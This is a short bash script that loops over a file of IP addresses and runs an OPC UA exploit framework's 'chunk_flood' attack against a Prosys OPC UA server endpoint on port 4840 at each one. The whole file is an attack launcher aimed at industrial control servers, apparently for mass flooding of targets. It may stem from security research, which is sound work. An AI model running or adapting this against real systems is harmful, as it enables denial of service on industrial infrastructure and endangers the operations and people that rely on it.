#!/bin/bash
set -xe

SCRIPT_DIR="$(dirname "$0")"


for addr in $(cat "$SCRIPT_DIR/results/opcua_imm_addrs.txt"| grep -v "==>"); do echo "$addr"; python3 "$SCRIPT_DIR/opcua-exploit-framework/main.py" prosys "$addr" 4840 /OPCUA/Server chunk_flood;  done